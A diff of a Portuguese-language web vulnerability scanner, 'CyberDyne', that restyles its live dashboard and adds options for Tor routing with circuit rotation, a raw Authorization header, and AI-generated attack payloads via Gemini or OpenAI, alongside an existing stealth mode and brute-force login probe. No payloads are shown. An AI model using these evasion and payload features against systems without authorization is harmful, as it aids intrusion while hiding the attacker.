+            if r.status_code == 200:
+                data = r.json()
+                _openai_tokens_used += data.get("usage", {}).get("total_tokens", 300)
+                text = data["choices"][0]["message"]["content"].strip()
+                return [l.strip() for l in text.splitlines() if l.strip()][:5]
+        except Exception:
+            pass
+    return []
 
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -13947,128 +15924,217 @@ _DASHBOARD_HTML = '''<!DOCTYPE html>
 <head>
 <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
 <title>CyberDyne Live</title>
+<script src="https://cdn.tailwindcss.com"></script>
 <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.4/dist/chart.umd.min.js"></script>
+<script>
+tailwind.config = {
+  theme: { extend: { colors: { cyber: '#dc2626' } } }
+}
+</script>
 <style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{background:#0f172a;color:#e2e8f0;font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh}
-.header{background:#1e293b;padding:20px 30px;border-bottom:2px solid #0d9488}
-.header h1{font-size:1.5rem;color:#0d9488;letter-spacing:2px}
-.header span{color:#64748b;font-size:.85rem}
-.grid{display:grid;grid-template-columns:repeat(5,1fr);gap:14px;padding:18px 30px}
-.card{background:#1e293b;border-radius:8px;padding:14px 16px;border-left:3px solid #0d9488}
-.card.red{border-left-color:#ef4444}.card.orange{border-left-color:#f59e0b}
-.card.blue{border-left-color:#3b82f6}.card.green{border-left-color:#22c55e}
-.card h3{font-size:.7rem;color:#64748b;text-transform:uppercase;margin-bottom:2px}
-.card .val{font-size:1.6rem;font-weight:700}
-.card.red .val{color:#ef4444}.card.orange .val{color:#f59e0b}
-.card.blue .val{color:#3b82f6}.card.green .val{color:#22c55e}
-.progress-bar{margin:0 30px;height:6px;background:#334155;border-radius:3px;overflow:hidden}
-.progress-fill{height:100%;background:linear-gradient(90deg,#0d9488,#22d3ee);transition:width .5s}
-.phase{padding:8px 30px;color:#94a3b8;font-size:.85rem}
-.chart-container{padding:12px 30px;height:220px}
-.chart-container canvas{background:#1e293b;border-radius:8px;padding:10px}
-.bottom-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px;padding:0 30px 20px}
-.vulns{max-height:35vh;overflow-y:auto}
-.vulns-title{color:#64748b;font-size:.75rem;text-transform:uppercase;padding:10px 0 6px;letter-spacing:1px}
-.vuln-item{background:#1e293b;margin:4px 0;padding:8px 12px;border-radius:6px;font-size:.8rem;
-border-left:3px solid #ef4444;display:flex;justify-content:space-between;align-items:center}
-.vuln-item .sev{font-weight:700;min-width:65px;text-align:right;font-size:.75rem}
-.sev.CRITICO{color:#ef4444}.sev.ALTO{color:#f59e0b}.sev.MEDIO{color:#3b82f6}.sev.BAIXO{color:#22c55e}
-.subs{max-height:35vh;overflow-y:auto}
-.sub-item{color:#94a3b8;font-size:.78rem;padding:3px 0;border-bottom:1px solid #1e293b}
+@keyframes pulse-red { 0%,100% { opacity:1 } 50% { opacity:.5 } }
+@keyframes slide-in { from { transform:translateX(100%);opacity:0 } to { transform:translateX(0);opacity:1 } }
+.pulse-red { animation: pulse-red 2s ease-in-out infinite }
+.slide-in { animation: slide-in 0.3s ease-out }
+::-webkit-scrollbar { width:6px } ::-webkit-scrollbar-track { background:#111 } ::-webkit-scrollbar-thumb { background:#333;border-radius:3px }
 </style>
 </head>
-<body>
-<div class="header"><h1>CYBERDYNE LIVE</h1><span id="target"></span></div>
-<div class="phase" id="phase"></div>
-<div class="progress-bar"><div class="progress-fill" id="pbar" style="width:0%"></div></div>
-<div class="grid">
-<div class="card red"><h3>Critico</h3><div class="val" id="c">0</div></div>
-<div class="card orange"><h3>Alto</h3><div class="val" id="a">0</div></div>
-<div class="card blue"><h3>Medio</h3><div class="val" id="m">0</div></div>
-<div class="card green"><h3>Baixo</h3><div class="val" id="b">0</div></div>
-<div class="card green"><h3>Seguro</h3><div class="val" id="s">0</div></div>
+<body class="bg-black text-white min-h-screen font-sans">
+
+<!-- Header -->
+<header class="border-b border-red-900/30 px-6 py-4 flex items-center justify-between">
+  <div>
+    <h1 class="text-2xl font-bold tracking-tight">
+      <span class="text-red-500">CYBERDYNE</span> <span class="text-white/60">LIVE</span>
+    </h1>
+    <p id="target" class="text-sm text-white/40 mt-1"></p>
+  </div>
+  <div class="text-right">
+    <div id="status-badge" class="inline-block px-3 py-1 rounded-full text-xs font-bold bg-red-900/30 text-red-400 pulse-red">SCANNING</div>
+    <p id="elapsed" class="text-sm text-white/40 mt-1 font-mono"></p>
+  </div>
+</header>
+
+<!-- Phase + Progress -->
+<div class="px-6 py-3 border-b border-white/5">
+  <p id="phase" class="text-sm text-white/60 mb-2"></p>
+  <div class="w-full bg-white/5 rounded-full h-2">
+    <div id="progress-bar" class="bg-gradient-to-r from-red-700 to-red-500 h-2 rounded-full transition-all duration-500" style="width:0%"></div>
+  </div>
+  <p id="progress-text" class="text-xs text-white/30 mt-1 font-mono"></p>
 </div>
-<div class="chart-container"><canvas id="timeline"></canvas></div>
-<div class="bottom-grid">
-<div>
-<div class="vulns-title">Vulnerabilidades encontradas</div>
-<div class="vulns" id="vulns"></div>
+
+<!-- Severity Cards -->
+<div class="grid grid-cols-5 gap-3 px-6 py-4">
+  <div class="bg-red-950/30 border border-red-900/40 rounded-xl p-4 text-center">
+    <p id="cnt-critico" class="text-3xl font-bold text-red-500">0</p>
+    <p class="text-xs text-red-400/60 mt-1 uppercase tracking-wider">Critico</p>
+  </div>
+  <div class="bg-orange-950/20 border border-orange-900/30 rounded-xl p-4 text-center">
+    <p id="cnt-alto" class="text-3xl font-bold text-orange-400">0</p>
+    <p class="text-xs text-orange-400/60 mt-1 uppercase tracking-wider">Alto</p>
+  </div>
+  <div class="bg-blue-950/20 border border-blue-900/30 rounded-xl p-4 text-center">
+    <p id="cnt-medio" class="text-3xl font-bold text-blue-400">0</p>
+    <p class="text-xs text-blue-400/60 mt-1 uppercase tracking-wider">Medio</p>
+  </div>
+  <div class="bg-green-950/20 border border-green-900/30 rounded-xl p-4 text-center">
+    <p id="cnt-baixo" class="text-3xl font-bold text-green-400">0</p>
+    <p class="text-xs text-green-400/60 mt-1 uppercase tracking-wider">Baixo</p>
+  </div>
+  <div class="bg-white/5 border border-white/10 rounded-xl p-4 text-center">
+    <p id="cnt-seguro" class="text-3xl font-bold text-emerald-400">0</p>
+    <p class="text-xs text-white/40 mt-1 uppercase tracking-wider">Seguro</p>
+  </div>
 </div>
-<div>
-<div class="vulns-title">Subdominios (<span id="sub-count">0</span>)</div>
-<div class="subs" id="subs"></div>
+
+<!-- Main Grid -->
+<div class="grid grid-cols-1 lg:grid-cols-3 gap-4 px-6 pb-4">
+  <!-- Chart (2/3) -->
+  <div class="lg:col-span-2 bg-[#0a0a0a] border border-white/5 rounded-xl p-4">
+    <h3 class="text-sm font-semibold text-white/60 mb-3 uppercase tracking-wider">Timeline de Vulnerabilidades</h3>
+    <canvas id="timeline-chart" height="200"></canvas>
+  </div>
+  <!-- Recon Stats (1/3) -->
+  <div class="bg-[#0a0a0a] border border-white/5 rounded-xl p-4">
+    <h3 class="text-sm font-semibold text-white/60 mb-3 uppercase tracking-wider">Recon Stats</h3>
+    <div class="space-y-3 text-sm" id="recon-stats">
+      <div class="flex justify-between"><span class="text-white/40">Subdominios</span><span id="stat-subs" class="font-mono text-white">0</span></div>
+      <div class="flex justify-between"><span class="text-white/40">URLs coletadas</span><span id="stat-urls" class="font-mono text-white">0</span></div>
+      <div class="flex justify-between"><span class="text-white/40">Checks feitos</span><span id="stat-checks" class="font-mono text-white">0</span></div>
+      <div class="flex justify-between"><span class="text-white/40">Vulneraveis</span><span id="stat-vulns" class="font-mono text-red-400">0</span></div>
+    </div>
+  </div>
 </div>
+
+<!-- Vuln Feed -->
+<div class="px-6 pb-4">
+  <div class="bg-[#0a0a0a] border border-white/5 rounded-xl p-4">
+    <h3 class="text-sm font-semibold text-white/60 mb-3 uppercase tracking-wider">Vulnerabilidades Detectadas</h3>
+    <div id="vuln-feed" class="space-y-2 max-h-72 overflow-y-auto">
+      <p class="text-white/20 text-sm italic">Aguardando resultados...</p>
+    </div>
+  </div>
 </div>
+
+<!-- Subdomains -->
+<div class="px-6 pb-6">
+  <div class="bg-[#0a0a0a] border border-white/5 rounded-xl p-4">
+    <h3 class="text-sm font-semibold text-white/60 mb-3 uppercase tracking-wider">Subdominios</h3>
+    <div id="subdomain-grid" class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-2 max-h-40 overflow-y-auto">
+      <p class="text-white/20 text-sm italic col-span-full">Nenhum subdomain encontrado ainda</p>
+    </div>
+  </div>
+</div>
+
+<!-- Footer -->
+<footer class="border-t border-white/5 px-6 py-3 text-center">
+  <p class="text-xs text-white/20">CyberDyne v6.0 | Live Dashboard</p>
+</footer>
+
 <script>
-const ctx=document.getElementById('timeline').getContext('2d');
-const chart=new Chart(ctx,{
-type:'line',
-data:{
-labels:[],
-datasets:[
-{label:'Checks',data:[],borderColor:'#22d3ee',backgroundColor:'rgba(34,211,238,0.1)',
-fill:true,tension:0.3,pointRadius:0,borderWidth:2},
-{label:'Vulns',data:[],borderColor:'#ef4444',backgroundColor:'rgba(239,68,68,0.1)',
-fill:true,tension:0.3,pointRadius:0,borderWidth:2}
-]
-},
-options:{
-responsive:true,maintainAspectRatio:false,
-animation:{duration:400},
-scales:{
-x:{ticks:{color:'#64748b',maxTicksLimit:12,font:{size:10}},grid:{color:'#1e293b'}},
-y:{ticks:{color:'#64748b',font:{size:10}},grid:{color:'#1e293b'},beginAtZero:true}
-},
-plugins:{
-legend:{labels:{color:'#94a3b8',font:{size:11},usePointStyle:true,pointStyle:'line'}},
-tooltip:{mode:'index',intersect:false}
+const sevColors = {CRITICO:'#ef4444',ALTO:'#f97316',MEDIO:'#3b82f6',BAIXO:'#22c55e'};
+let chart;
+const timeLabels = [];
+const vulnData = [];
+const checkData = [];
+
+function initChart() {
+  const ctx = document.getElementById('timeline-chart').getContext('2d');
+  chart = new Chart(ctx, {
+    type: 'line',
+    data: {
+      labels: timeLabels,
+      datasets: [
+        {label:'Vulneraveis',data:vulnData,borderColor:'#ef4444',backgroundColor:'rgba(239,68,68,0.1)',fill:true,tension:0.4,pointRadius:0,borderWidth:2},
+        {label:'Checks',data:checkData,borderColor:'#ffffff40',backgroundColor:'transparent',fill:false,tension:0.4,pointRadius:0,borderWidth:1,borderDash:[4,4]}
+      ]
+    },
+    options: {
+      responsive:true,
+      maintainAspectRatio:false,
+      plugins:{legend:{display:true,labels:{color:'#ffffff60',font:{size:10}}}},
+      scales:{
+        x:{display:true,ticks:{color:'#ffffff20',maxTicksLimit:8,font:{size:9}},grid:{color:'#ffffff08'}},
+        y:{display:true,ticks:{color:'#ffffff20',font:{size:9}},grid:{color:'#ffffff08'},beginAtZero:true}
+      }
+    }
+  });
 }
+
+function updateDashboard(data) {
+  document.getElementById('target').textContent = data.target || '';
+  document.getElementById('phase').textContent = data.phase || '';
+
+  // Status badge
+  const badge = document.getElementById('status-badge');
+  if (data.status === 'complete') { badge.textContent='COMPLETO'; badge.className='inline-block px-3 py-1 rounded-full text-xs font-bold bg-green-900/30 text-green-400'; }
+
+  // Progress
+  const pct = data.total > 0 ? Math.round(data.progress / data.total * 100) : 0;
+  document.getElementById('progress-bar').style.width = pct + '%';
+  document.getElementById('progress-text').textContent = data.total > 0 ? data.progress + '/' + data.total + ' (' + pct + '%)' : '';
+
+  // Severity counts
+  const s = data.results_summary || {};
+  document.getElementById('cnt-critico').textContent = s.critico || 0;
+  document.getElementById('cnt-alto').textContent = s.alto || 0;
+  document.getElementById('cnt-medio').textContent = s.medio || 0;
+  document.getElementById('cnt-baixo').textContent = s.baixo || 0;
+  document.getElementById('cnt-seguro').textContent = s.seguro || 0;
+
+  // Stats
+  document.getElementById('stat-subs').textContent = (data.subdomains || []).length;
+  document.getElementById('stat-checks').textContent = data.progress || 0;
+  const totalVulns = (s.critico||0) + (s.alto||0) + (s.medio||0) + (s.baixo||0);
+  document.getElementById('stat-vulns').textContent = totalVulns;
+
+  // Timeline chart
+  if (data.timeline && data.timeline.length > 0) {
+    const latest = data.timeline[data.timeline.length - 1];
+    if (!timeLabels.length || timeLabels[timeLabels.length-1] !== latest.t) {
+      timeLabels.push(latest.t);
+      vulnData.push(latest.vulns || 0);
+      checkData.push(latest.checks || 0);
+      if (timeLabels.length > 60) { timeLabels.shift(); vulnData.shift(); checkData.shift(); }
+      chart.update('none');
+    }
+  }
+
+  // Vuln feed
+  const feed = document.getElementById('vuln-feed');
+  const vulns = data.vulns || [];
+  if (vulns.length > 0) {
+    feed.innerHTML = '';
+    for (const v of vulns.slice(-25).reverse()) {
+      const color = sevColors[v.sev] || '#6b7280';
+      const div = document.createElement('div');
+      div.className = 'flex items-center gap-3 py-1.5 px-2 rounded bg-white/[0.02] slide-in';
+      div.innerHTML = '<span style="color:'+color+'" class="font-bold text-xs w-16">['+String(v.id).padStart(3,'0')+']</span>' +
+        '<span class="text-sm flex-1 truncate">'+v.name+'</span>' +
+        '<span style="color:'+color+'" class="text-xs font-semibold">'+v.sev+'</span>';
+      feed.appendChild(div);
+    }
+  }
+
+  // Subdomains
+  const sgrid = document.getElementById('subdomain-grid');
+  const subs = data.subdomains || [];
+  if (subs.length > 0) {
+    sgrid.innerHTML = '';
+    for (const sub of subs.slice(0, 50)) {
+      const div = document.createElement('div');
+      div.className = 'text-xs text-white/50 truncate py-1 px-2 bg-white/[0.02] rounded';
+      div.innerHTML = '<span class="text-green-500 mr-1">&#9679;</span>' + sub;
+      sgrid.appendChild(div);
+    }
+  }
 }
-});
-let prevTimeline=0;
-async function poll(){
-try{const r=await fetch('/api/status');const d=await r.json();
-document.getElementById('target').textContent=d.target;
-document.getElementById('phase').textContent=d.phase+' — '+d.progress+'/'+d.total;
-document.getElementById('pbar').style.width=(d.total?Math.round(d.progress/d.total*100):0)+'%';
-document.getElementById('c').textContent=d.results_summary.critico;
-document.getElementById('a').textContent=d.results_summary.alto;
-document.getElementById('m').textContent=d.results_summary.medio;
-document.getElementById('b').textContent=d.results_summary.baixo;
-document.getElementById('s').textContent=d.results_summary.seguro;
-// Chart update
-if(d.timeline&&d.timeline.length>prevTimeline){
-const newPts=d.timeline.slice(prevTimeline);
-newPts.forEach(p=>{
-chart.data.labels.push(p.t);
-chart.data.datasets[0].data.push(p.checks);
-chart.data.datasets[1].data.push(p.vulns);
-});
-if(chart.data.labels.length>60){
-const excess=chart.data.labels.length-60;
-chart.data.labels.splice(0,excess);
-chart.data.datasets[0].data.splice(0,excess);
-chart.data.datasets[1].data.splice(0,excess);
-}
-chart.update('none');
-prevTimeline=d.timeline.length;
-}
-// Vulns list
-let h='';d.vulns.slice(-25).reverse().forEach(v=>{
-const bc=v.sev==='CRITICO'?'#ef4444':v.sev==='ALTO'?'#f59e0b':v.sev==='MEDIO'?'#3b82f6':'#22c55e';
-h+='<div class="vuln-item" style="border-left-color:'+bc+'"><span>['+v.id+'] '+v.name+'</span><span class="sev '+v.sev+'">'+v.sev+'</span></div>';
-});document.getElementById('vulns').innerHTML=h;
-// Subdomains
-if(d.subdomains&&d.subdomains.length){
-document.getElementById('sub-count').textContent=d.subdomains.length;
-let sh='';d.subdomains.slice(0,50).forEach(s=>{sh+='<div class="sub-item">'+s+'</div>';});
-document.getElementById('subs').innerHTML=sh;
-}
-}catch(e){}
-setTimeout(poll,2000);
-}
-poll();
+
+initChart();
+setInterval(() => {
+  fetch('/api/status').then(r => r.json()).then(updateDashboard).catch(() => {});
+}, 2000);
 </script>
 </body></html>'''
 
@@ -14189,10 +16255,13 @@ Exemplos de uso:
     parser.add_argument("--login", type=str, default="", help="URL do painel de login (opcional)")
     parser.add_argument("-ul", "--userlogin", type=str, default="", help="Email ou usuario para login autenticado")
     parser.add_argument("-pl", "--passlogin", type=str, default="", help="Senha para login autenticado")
+    parser.add_argument("--auth-header", type=str, default="", help="Authorization header direto (ex: 'Bearer eyJ...')")
     parser.add_argument("--all", action="store_true", default=False, help="Executar tudo: recon + vuln + relatorios")
     parser.add_argument("--recon", action="store_true", default=False, help="Apenas reconhecimento")
     parser.add_argument("--vuln", action="store_true", default=False, help="Apenas scan de vulnerabilidades")
     parser.add_argument("--stealth", action="store_true", default=False, help="Modo fantasma: delay random + UA rotation")
+    parser.add_argument("--tor", action="store_true", default=False,
+                        help="Roteia tráfego da Fase 2 via Tor (SOCKS5 127.0.0.1:9050)")
     parser.add_argument("--ai-payloads", action="store_true", default=False, help="Gemini gera payloads contextuais para cada alvo")
     parser.add_argument("--live", action="store_true", default=False, help="Dashboard visual em localhost:5000")
     parser.add_argument("--wp", action="store_true", default=False,
@@ -14355,10 +16424,14 @@ Exemplos de uso:
         if args.stealth:
             log(f"  {Fore.MAGENTA + Style.BRIGHT}[STEALTH] Modo fantasma ativo — delay random + UA rotation{Style.RESET_ALL}")
         if args.ai_payloads:
-            if GEMINI_API_KEY:
+            if GEMINI_API_KEY and OPENAI_API_KEY:
+                log(f"  {Fore.CYAN + Style.BRIGHT}[AI] Payloads contextuais ativados (Gemini + OpenAI fallback){Style.RESET_ALL}")
+            elif GEMINI_API_KEY:
                 log(f"  {Fore.CYAN + Style.BRIGHT}[AI] Payloads contextuais Gemini ativados{Style.RESET_ALL}")
+            elif OPENAI_API_KEY:
+                log(f"  {Fore.CYAN + Style.BRIGHT}[AI] Payloads contextuais OpenAI ativados{Style.RESET_ALL}")
             else:
-                log(f"  {Fore.YELLOW}[~] --ai-payloads requer GEMINI_API_KEY no .env{Style.RESET_ALL}")
+                log(f"  {Fore.YELLOW}[~] --ai-payloads requer GEMINI_API_KEY ou OPENAI_API_KEY no .env{Style.RESET_ALL}")
                 args.ai_payloads = False
     else:
         # Modo interativo (legado)
@@ -14393,6 +16466,11 @@ Exemplos de uso:
     # ── Ativar modos especiais ─────────────────────────────────────────────────
     _STEALTH_MODE = args.stealth if args.url else False
     _AI_PAYLOADS_MODE = args.ai_payloads if args.url else False
+
+    global _auth_header
+    if hasattr(args, 'auth_header') and args.auth_header:
+        _auth_header = args.auth_header.strip()
+        log(f"  {Fore.GREEN}[AUTH] Header Authorization configurado: {_auth_header[:30]}...{Style.RESET_ALL}")
 
     # ── Payload Intensity ────────────────────────────────────────────────────
     if args.medium:
@@ -14538,6 +16616,15 @@ Exemplos de uso:
         except Exception as e:
             log(f"{Fore.YELLOW}[~] Erro no crawler autenticado: {e}{Style.RESET_ALL}")
 
+    # ── Tor activation (only for Phase 2) ────────────────────────────────────
+    global _TOR_MODE
+    if hasattr(args, 'tor') and args.tor:
+        if not HAS_SOCKS:
+            log(f"  {Fore.YELLOW}[TOR] --tor requer PySocks: pip install pysocks requests[socks]{Style.RESET_ALL}")
+        elif _check_tor_running():
+            _TOR_MODE = True
+            log(f"  {Fore.GREEN}[TOR] Fase 2 via Tor — novo circuito a cada 50 requests{Style.RESET_ALL}")
+
     # ── FASE 2: SCAN DE VULNERABILIDADES ──────────────────────────────────────
     results = []
     if do_vuln:
@@ -14549,6 +16636,11 @@ Exemplos de uso:
 
         scanner = VulnScanner(target, all_urls, output_dir, login_url=login_url)
         results = scanner.run_all(subdomains=subdomains)
+
+    # Desativar Tor após Fase 2
+    if _TOR_MODE:
+        _TOR_MODE = False
+        log(f"  {Fore.CYAN}[TOR] Desativado — {_TOR_REQUEST_COUNT} requests via Tor{Style.RESET_ALL}")
 
     # ── FASE 2.5: BROWSER MIMIC (Playwright) ─────────────────────────────
     _do_browser = False
@@ -14692,11 +16784,13 @@ Exemplos de uso:
         probe = BruteForceProbe(login_url, output_dir)
         probe.run()
 
-    # ── Gemini token usage ─────────────────────────────────────────────────────
+    # ── AI token usage ─────────────────────────────────────────────────────────
     if _gemini_tokens_used > 0:
         # Gemini 2.0 Flash Lite: 1M tokens/min free tier
         remaining = max(0, 1_000_000 - _gemini_tokens_used)
         log(f"\n  {Fore.CYAN}[Gemini] Tokens usados: {_gemini_tokens_used:,} | Restante free tier: ~{remaining:,}/1,000,000{Style.RESET_ALL}")
+    if _openai_tokens_used > 0:
+        log(f"  {Fore.CYAN}[OpenAI] Tokens usados: {_openai_tokens_used:,}{Style.RESET_ALL}")
 
     if hasattr(args, 'live') and args.live:
         _live_update(phase="SCAN FINALIZADO", progress=_live_data["total"], total=_live_data["total"])
